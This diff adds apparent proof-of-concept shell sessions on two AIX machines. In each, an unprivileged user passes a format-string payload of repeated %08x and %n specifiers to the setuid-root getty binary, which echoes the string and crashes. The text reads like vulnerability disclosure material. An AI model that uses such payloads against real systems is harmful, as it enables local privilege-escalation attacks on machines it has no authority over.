@@ -1,0 +1,18 @@
+$ uname -a
+AIX alpine 2 4 005D98284C00
+$ id
+uid=100(guest) gid=100(usr)
+$ ls -al /usr/sbin/getty 
+-r-sr-xr-x   3 root     security   56558 Mar 26 1997  /usr/sbin/getty
+$ getty 08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%n%n%n%n%n%n
+08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%n%n%n%n%n%n: TSM: The specified portname is too long.
+Segmentation fault
+
+$ uname -a
+AIX bigblue 0 5 001990014C00
+$ ls -al /usr/sbin/getty
+-r-sr-xr-x   3 root     security      61346 Sep 22 2000  /usr/sbin/getty
+$ getty 08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%n%n%n%n%n%n
+08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%n%n%n%n%n%n: 3004-037 TSM: The specified portname is too long.
+Segmentation fault
+
